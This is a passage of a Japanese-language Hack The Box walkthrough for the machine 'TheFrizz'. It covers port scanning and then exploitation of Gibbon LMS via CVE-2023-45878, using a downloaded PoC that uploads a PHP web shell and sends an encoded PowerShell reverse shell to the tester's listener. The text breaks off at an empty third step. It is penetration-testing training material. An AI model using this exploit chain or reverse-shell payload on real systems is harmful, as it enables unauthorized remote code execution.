https://app.hackthebox.com/machines/652

## STEP 1
```sh
└─$ rustscan -a 10.129.232.168 --no-banner --scripts none
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.129.232.168:22
Open 10.129.232.168:53
Open 10.129.232.168:80
Open 10.129.232.168:88
Open 10.129.232.168:135
Open 10.129.232.168:139
Open 10.129.232.168:389
Open 10.129.232.168:445
Open 10.129.232.168:464
Open 10.129.232.168:593
Open 10.129.232.168:636
Open 10.129.232.168:3269
Open 10.129.232.168:3268
Open 10.129.232.168:9389
Open 10.129.232.168:49664
Open 10.129.232.168:49667
Open 10.129.232.168:49670
Open 10.129.232.168:61670
Open 10.129.232.168:61666
Open 10.129.232.168:61681
10.129.232.168 -> [22,53,80,88,135,139,389,445,464,593,636,3269,3268,9389,49664,49667,49670,61670,61666,61681]
```


## STEP 2
80番にアクセス  
frizzdc.frizz.htbにリダイレクトされるっぽい
```sh
└─$ curl http://10.129.232.168 
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>302 Found</title>
</head><body>
<h1>Found</h1>
<p>The document has moved <a href="http://frizzdc.frizz.htb/home/">here</a>.</p>
<hr>
<address>Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.2.12 Server at 10.129.232.168 Port 80</address>
</body></html>
```
hostsを編集
```sh
└─$ tail -n1 /etc/hosts    
10.129.232.168 frizzdc.frizz.htb
```
「frizzdc.frizz.htb/home/」にアクセス
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/TheFrizz_01.png">  
「staff logoin」をクリックすると、別ページに移動した  
このwebはgibbon v25.0.000で動作しているっぽい  
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/TheFrizz_02.png">  
gibbon v25.0.000はcve-2023-45878の対象であり、認証なしでrceが可能である  
PoCをダウンロードして実行
```sh
└─$ wget -nv https://raw.githubusercontent.com/davidzzo23/CVE-2023-45878/refs/heads/main/CVE-2023-45878.py             
2025-10-29 09:02:53 URL:https://raw.githubusercontent.com/davidzzo23/CVE-2023-45878/refs/heads/main/CVE-2023-45878.py [3697/3697] -> "CVE-2023-45878.py" [1]

└─$ python3.13 CVE-2023-45878.py -h
usage: CVE-2023-45878.py [-h] -t TARGET [-c COMMAND] [-s] [-i IP] [-p PORT]

GibbonEdu Web Shell Exploit (CVE-2023-45878)

options:
  -h, --help            show this help message and exit
  -t, --target TARGET   Target domain (e.g., frizzdc.frizz.htb)
  -c, --command COMMAND
                        Command to execute remotely
  -s, --shell           Trigger PowerShell reverse shell
  -i, --ip IP           Attacker IP for reverse shell (required with -s)
  -p, --port PORT       Attacker port for reverse shell (required with -s)

└─$ python3.13 CVE-2023-45878.py -t 10.129.232.168 -s -i 10.10.16.28 -p 4444
[+] Uploading web shell as wahvsfrg.php...
[+] Upload successful.
[+] Sending PowerShell reverse shell payload to http://10.129.232.168/Gibbon-LMS/wahvsfrg.php
[*] Make sure your listener is running: nc -lvnp 4444
[+] Executing command on: http://10.129.232.168/Gibbon-LMS/wahvsfrg.php?cmd=powershell -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand CgAgACAAIAAgACQAYwBsAGkAZQBuAHQAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBTAG8AYwBrAGUAdABzAC4AVABDAFAAQwBsAGkAZQBuAHQAKAAiADEAMAAuADEAMAAuADEANgAuADIAOAAiACwANAA0ADQANAApADsACgAgACAAIAAgACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AAoAIAAgACAAIABbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AAoAIAAgACAAIAB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsACgAgACAAIAAgACAAIAAgACAAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsACgAgACAAIAAgACAAIAAgACAAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAKACAAIAAgACAAIAAgACAAIAAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACcAUABTACAAJwAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACcAPgAgACcAOwAKACAAIAAgACAAIAAgACAAIAAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7AAoAIAAgACAAIAAgACAAIAAgACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAKACAAIAAgACAAIAAgACAAIAAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQA7AAoAIAAgACAAIAB9AAoAIAAgACAAIAAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQAKACAAIAAgACAA
[!] Error connecting to web shell: HTTPConnectionPool(host='10.129.232.168', port=80): Read timed out. (read timeout=5)
```
リバースシェル取得
```sh
└─$ rlwrap nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.16.28] from (UNKNOWN) [10.129.232.168] 55489

PS C:\xampp\htdocs\Gibbon-LMS> whoami
frizz\w.webservice
```

## STEP 3
